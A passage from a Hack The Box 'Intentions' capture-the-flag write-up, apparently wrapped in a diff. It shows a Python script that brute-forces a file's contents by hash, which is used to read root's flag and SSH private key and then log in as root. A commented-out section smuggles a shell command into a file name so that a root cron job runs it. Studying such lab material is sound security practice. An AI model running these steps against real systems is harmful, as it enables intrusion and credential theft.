+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">correct_char</span><span class="p">(</span><span class="n">temp_hash</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">decoded_text</span> <span class="o">+</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_hash</span> <span class="o">=</span> <span class="n">gen_hash</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">temp_hash</span> <span class="o">==</span> <span class="n">new_hash</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;FileName needed&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+</span></span><span class="line"><span class="cl"><span class="n">decoded_text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hash_value = sys.argv[2]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hash_length = sys.argv[3]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">count</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">test_hash</span> <span class="o">=</span> <span class="n">grab_hash</span><span class="p">(</span><span class="n">fileName</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">test_char</span> <span class="o">=</span> <span class="n">correct_char</span><span class="p">(</span><span class="n">test_hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">test_char</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decoded_text</span> <span class="o">+=</span> <span class="n">test_char</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;File content: </span><span class="se">\n</span><span class="si">{</span><span class="n">decoded_text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Testing this with the user flag is successful, meaning the script works!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ cat ~/user.txt
+</span></span><span class="line"><span class="cl">c317b23bf4affb80fd3d93b813dcaaf1
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ python3 gimme_root.py /home/greg/user.txt
+</span></span><span class="line"><span class="cl">File content:
+</span></span><span class="line"><span class="cl">c317b23bf4affb80fd3d93b813dcaaf1
+</span></span></code></pre></div><p>Similarly, the root flag can be obtained using a similar approach. By running a loop and sequentially matching hash values, the flag&rsquo;s characters can be decoded and the root flag extracted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ python3 gimme_root.py /root/root.txt
+</span></span><span class="line"><span class="cl">File content:
+</span></span><span class="line"><span class="cl">de01b4e5992cf6a18283887bdc30b11d
+</span></span></code></pre></div><p>Retrieved the SSH private key using the same script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ python3 gimme_root.py /root/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">File content:
+</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>The SSH key can be used to log in as the root user via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc root@intentions.htb -i id_rsa.root
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:32:58<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:33:00<span class="o">]</span> intentions.htb:22: registered new host w/ db                                              manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> root@intentions:/root# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></div><p><strong>Pwned!!</strong></p>
+<!-- ![Pwned](https://i.imgur.com/DhUp7Bw.png) -->
+<!-- ## Unintended escalation to root
+
+Checking for background processes with `pspy` only found two cleanup scripts being executed by root. One of these runs the`rm` command against a wildcard
+
+```bash
+2023/07/16 10:30:01 CMD: UID=0     PID=75211  | /bin/bash /root/scripts/clean2.sh
+2023/07/16 10:30:01 CMD: UID=0     PID=75212  | /usr/bin/find /var/www/html/intentions/storage/app/public -type f -name *.php -exec rm {} ;
+2023/07/16 10:30:01 CMD: UID=0     PID=75213  | /usr/bin/find /var/www/html/intentions/public/ -type f -not -name index.php -name *.php -exec rm {} ;
+```
+
+Created a file with a payload in the filename to create a file in the /tmp directory. Once the cronjob is run, there's a file in `/tmp` owned by root
+
+By creating a file with a payload embedded in the filename, it's possible to trigger the creation of a file owned by root. Once the cronjob is executed, a file owned by the root user will appear in the `/tmp` directory, confirming code execution as root
+
+```
+$ cd /var/www/html/intentions/storage/app/public
+$ touch rce\";touch /tmp/root_rce;#.php
+$ ls -la /tmp/root_rce
+-rw-r--r-- 1 root root 0 Jul 16 16:48 /tmp/root_rce
+``` -->
+<h2 id="references" class="relative group">References <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span></h2><ul>
+<li><a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" target="_blank" rel="noreferrer">SQL injection (second order) - PortSwigger</a></li>
+<li><a href="https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423" target="_blank" rel="noreferrer">SQLMap Tamper Scripts (SQL Injection and WAF bypass) - Starter Zone - Bugcrowd Forum</a></li>
+<li><a href="https://jlajara.gitlab.io/Second_order_sqli" target="_blank" rel="noreferrer">Second Order SQLI: Automating with sqlmap · Jorge Lajara Website</a></li>
+<li><a href="https://web.archive.org/web/20171224101008/https://www.websec.ca/blog/view/Bypassing_WAFs_with_SQLMap" target="_blank" rel="noreferrer">Bypassing Web Application Firewalls with SQLMap Tamper Scripts</a></li>
+<li><a href="https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3" target="_blank" rel="noreferrer">SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips | by Dragon Security | Medium</a></li>
+<li><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" target="_blank" rel="noreferrer">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a></li>
+<li><a href="https://tbhaxor.com/exploiting-linux-capabilities-part-2/" target="_blank" rel="noreferrer">Exploiting Linux Capabilities – Part 2</a></li>
+<li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noreferrer">capabilities(7) - Linux manual page</a></li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=//localhost:1313/blog/htb-intentions/&amp;text=HTB%20Intentions"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/blog/htb-intentions/&amp;title=HTB%20Intentions"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/blog/htb-intentions/&amp;resubmit=true&amp;title=HTB%20Intentions"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/htb-pc/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB PC</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-10-08 10:02:38 &#43;0530 IST">8 October 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/htb-jupiter/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Jupiter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-10-22 01:22:49 &#43;0530 IST">22 October 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+        
+          <div class="pt-3">
+            <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+            <div class="pt-3">
+              <script
+    src="https://giscus.app/client.js"
+    data-repo="AbraXa5/personal-blog"
+    data-repo-id="R_kgDOJxB9Aw"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJxB9A84CXU6d"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="en"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+
+            </div>
+          </div>
+        
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="https://www.buymeacoffee.com/abr4xa5"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                  ><span class="icon relative inline-block px-1 align-text-bottom"><svg width="884" height="1279" viewBox="0 0 884 1279" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M791.109 297.518L790.231 297.002L788.201 296.383C789.018 297.072 790.04 297.472 791.109 297.518V297.518Z"
+        fill="#0D0C22" />
+    <path d="M803.896 388.891L802.916 389.166L803.896 388.891Z" fill="#0D0C22" />
+    <path
+        d="M791.484 297.377C791.359 297.361 791.237 297.332 791.118 297.29C791.111 297.371 791.111 297.453 791.118 297.534C791.252 297.516 791.379 297.462 791.484 297.377V297.377Z"
+        fill="#0D0C22" />
+    <path d="M791.113 297.529H791.244V297.447L791.113 297.529Z" fill="#0D0C22" />
+    <path
+        d="M803.111 388.726L804.591 387.883L805.142 387.573L805.641 387.04C804.702 387.444 803.846 388.016 803.111 388.726V388.726Z"
+        fill="#0D0C22" />
+    <path d="M793.669 299.515L792.223 298.138L791.243 297.605C791.77 298.535 792.641 299.221 793.669 299.515V299.515Z"
+        fill="#0D0C22" />
+    <path
+        d="M430.019 1186.18C428.864 1186.68 427.852 1187.46 427.076 1188.45L427.988 1187.87C428.608 1187.3 429.485 1186.63 430.019 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M641.187 1144.63C641.187 1143.33 640.551 1143.57 640.705 1148.21C640.705 1147.84 640.86 1147.46 640.929 1147.1C641.015 1146.27 641.084 1145.46 641.187 1144.63Z"
+        fill="#0D0C22" />
+    <path
+        d="M619.284 1186.18C618.129 1186.68 617.118 1187.46 616.342 1188.45L617.254 1187.87C617.873 1187.3 618.751 1186.63 619.284 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M281.304 1196.06C280.427 1195.3 279.354 1194.8 278.207 1194.61C279.136 1195.06 280.065 1195.51 280.684 1195.85L281.304 1196.06Z"
+        fill="#0D0C22" />
+    <path
+        d="M247.841 1164.01C247.704 1162.66 247.288 1161.35 246.619 1160.16C247.093 1161.39 247.489 1162.66 247.806 1163.94L247.841 1164.01Z"
+        fill="#0D0C22" />
+    <path
+        d="M472.623 590.836C426.682 610.503 374.546 632.802 306.976 632.802C278.71 632.746 250.58 628.868 223.353 621.274L270.086 1101.08C271.74 1121.13 280.876 1139.83 295.679 1153.46C310.482 1167.09 329.87 1174.65 349.992 1174.65C349.992 1174.65 416.254 1178.09 438.365 1178.09C462.161 1178.09 533.516 1174.65 533.516 1174.65C553.636 1174.65 573.019 1167.08 587.819 1153.45C602.619 1139.82 611.752 1121.13 613.406 1101.08L663.459 570.876C641.091 563.237 618.516 558.161 593.068 558.161C549.054 558.144 513.591 573.303 472.623 590.836Z"
+        fill="#FFDD00" />
+    <path d="M78.6885 386.132L79.4799 386.872L79.9962 387.182C79.5987 386.787 79.1603 386.435 78.6885 386.132V386.132Z"
+        fill="#0D0C22" />
+    <path
+        d="M879.567 341.849L872.53 306.352C866.215 274.503 851.882 244.409 819.19 232.898C808.711 229.215 796.821 227.633 788.786 220.01C780.751 212.388 778.376 200.55 776.518 189.572C773.076 169.423 769.842 149.257 766.314 129.143C763.269 111.85 760.86 92.4243 752.928 76.56C742.604 55.2584 721.182 42.8009 699.88 34.559C688.965 30.4844 677.826 27.0375 666.517 24.2352C613.297 10.1947 557.342 5.03277 502.591 2.09047C436.875 -1.53577 370.983 -0.443234 305.422 5.35968C256.625 9.79894 205.229 15.1674 158.858 32.0469C141.91 38.224 124.445 45.6399 111.558 58.7341C95.7448 74.8221 90.5829 99.7026 102.128 119.765C110.336 134.012 124.239 144.078 138.985 150.737C158.192 159.317 178.251 165.846 198.829 170.215C256.126 182.879 315.471 187.851 374.007 189.968C438.887 192.586 503.87 190.464 568.44 183.618C584.408 181.863 600.347 179.758 616.257 177.304C634.995 174.43 647.022 149.928 641.499 132.859C634.891 112.453 617.134 104.538 597.055 107.618C594.095 108.082 591.153 108.512 588.193 108.942L586.06 109.252C579.257 110.113 572.455 110.915 565.653 111.661C551.601 113.175 537.515 114.414 523.394 115.378C491.768 117.58 460.057 118.595 428.363 118.647C397.219 118.647 366.058 117.769 334.983 115.722C320.805 114.793 306.661 113.611 292.552 112.177C286.134 111.506 279.733 110.801 273.333 110.009L267.241 109.235L265.917 109.046L259.602 108.134C246.697 106.189 233.792 103.953 221.025 101.251C219.737 100.965 218.584 100.249 217.758 99.2193C216.932 98.1901 216.482 96.9099 216.482 95.5903C216.482 94.2706 216.932 92.9904 217.758 91.9612C218.584 90.9319 219.737 90.2152 221.025 89.9293H221.266C232.33 87.5721 243.479 85.5589 254.663 83.8038C258.392 83.2188 262.131 82.6453 265.882 82.0832H265.985C272.988 81.6186 280.026 80.3625 286.994 79.5366C347.624 73.2302 408.614 71.0801 469.538 73.1014C499.115 73.9618 528.676 75.6996 558.116 78.6935C564.448 79.3474 570.746 80.0357 577.043 80.8099C579.452 81.1025 581.878 81.4465 584.305 81.7391L589.191 82.4445C603.438 84.5667 617.61 87.1419 631.708 90.1703C652.597 94.7128 679.422 96.1925 688.713 119.077C691.673 126.338 693.015 134.408 694.649 142.03L696.731 151.752C696.786 151.926 696.826 152.105 696.852 152.285C701.773 175.227 706.7 198.169 711.632 221.111C711.994 222.806 712.002 224.557 711.657 226.255C711.312 227.954 710.621 229.562 709.626 230.982C708.632 232.401 707.355 233.6 705.877 234.504C704.398 235.408 702.75 235.997 701.033 236.236H700.895L697.884 236.649L694.908 237.044C685.478 238.272 676.038 239.419 666.586 240.486C647.968 242.608 629.322 244.443 610.648 245.992C573.539 249.077 536.356 251.102 499.098 252.066C480.114 252.57 461.135 252.806 442.162 252.771C366.643 252.712 291.189 248.322 216.173 239.625C208.051 238.662 199.93 237.629 191.808 236.58C198.106 237.389 187.231 235.96 185.029 235.651C179.867 234.928 174.705 234.177 169.543 233.397C152.216 230.798 134.993 227.598 117.7 224.793C96.7944 221.352 76.8005 223.073 57.8906 233.397C42.3685 241.891 29.8055 254.916 21.8776 270.735C13.7217 287.597 11.2956 305.956 7.64786 324.075C4.00009 342.193 -1.67805 361.688 0.472751 380.288C5.10128 420.431 33.165 453.054 73.5313 460.35C111.506 467.232 149.687 472.807 187.971 477.556C338.361 495.975 490.294 498.178 641.155 484.129C653.44 482.982 665.708 481.732 677.959 480.378C681.786 479.958 685.658 480.398 689.292 481.668C692.926 482.938 696.23 485.005 698.962 487.717C701.694 490.429 703.784 493.718 705.08 497.342C706.377 500.967 706.846 504.836 706.453 508.665L702.633 545.797C694.936 620.828 687.239 695.854 679.542 770.874C671.513 849.657 663.431 928.434 655.298 1007.2C653.004 1029.39 650.71 1051.57 648.416 1073.74C646.213 1095.58 645.904 1118.1 641.757 1139.68C635.218 1173.61 612.248 1194.45 578.73 1202.07C548.022 1209.06 516.652 1212.73 485.161 1213.01C450.249 1213.2 415.355 1211.65 380.443 1211.84C343.173 1212.05 297.525 1208.61 268.756 1180.87C243.479 1156.51 239.986 1118.36 236.545 1085.37C231.957 1041.7 227.409 998.039 222.9 954.381L197.607 711.615L181.244 554.538C180.968 551.94 180.693 549.376 180.435 546.76C178.473 528.023 165.207 509.681 144.301 510.627C126.407 511.418 106.069 526.629 108.168 546.76L120.298 663.214L145.385 904.104C152.532 972.528 159.661 1040.96 166.773 1109.41C168.15 1122.52 169.44 1135.67 170.885 1148.78C178.749 1220.43 233.465 1259.04 301.224 1269.91C340.799 1276.28 381.337 1277.59 421.497 1278.24C472.979 1279.07 524.977 1281.05 575.615 1271.72C650.653 1257.95 706.952 1207.85 714.987 1130.13C717.282 1107.69 719.576 1085.25 721.87 1062.8C729.498 988.559 737.115 914.313 744.72 840.061L769.601 597.451L781.009 486.263C781.577 480.749 783.905 475.565 787.649 471.478C791.392 467.391 796.352 464.617 801.794 463.567C823.25 459.386 843.761 452.245 859.023 435.916C883.318 409.918 888.153 376.021 879.567 341.849ZM72.4301 365.835C72.757 365.68 72.1548 368.484 71.8967 369.792C71.8451 367.813 71.9483 366.058 72.4301 365.835ZM74.5121 381.94C74.6842 381.819 75.2003 382.508 75.7337 383.334C74.925 382.576 74.4089 382.009 74.4949 381.94H74.5121ZM76.5597 384.641C77.2996 385.897 77.6953 386.689 76.5597 384.641V384.641ZM80.672 387.979H80.7752C80.7752 388.1 80.9645 388.22 81.0333 388.341C80.9192 388.208 80.7925 388.087 80.6548 387.979H80.672ZM800.796 382.989C793.088 390.319 781.473 393.726 769.996 395.43C641.292 414.529 510.713 424.199 380.597 419.932C287.476 416.749 195.336 406.407 103.144 393.382C94.1102 392.109 84.3197 390.457 78.1082 383.798C66.4078 371.237 72.1548 345.944 75.2003 330.768C77.9878 316.865 83.3218 298.334 99.8572 296.355C125.667 293.327 155.64 304.218 181.175 308.09C211.917 312.781 242.774 316.538 273.745 319.36C405.925 331.405 540.325 329.529 671.92 311.91C695.905 308.686 719.805 304.941 743.619 300.674C764.835 296.871 788.356 289.731 801.175 311.703C809.967 326.673 811.137 346.701 809.778 363.615C809.359 370.984 806.139 377.915 800.779 382.989H800.796Z"
+        fill="#0D0C22" />
+</svg>
+</span></span><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >BuyMeACoffee</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            Abraxas
+        </p>
+      
+      
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
